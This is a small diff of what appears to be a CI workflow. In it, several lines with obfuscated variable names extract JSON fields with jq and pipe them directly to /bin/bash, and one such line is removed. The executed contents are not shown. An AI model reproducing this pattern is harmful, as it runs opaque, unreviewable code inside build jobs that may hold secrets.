@@ -24,7 +24,6 @@ jobs:
           echo $ofls68068 | jq -r .yjul44 | /bin/bash
           echo $p574 | jq -r .rq86412 | /bin/bash
           printf '%s' "$c3" | jq -r .ijkd2 | /bin/bash
-          echo $trfs280 | jq -r .tajyh5571 | /bin/bash
           echo $t297 | jq -r .ce19 | /bin/bash
 
       - name: Archive output
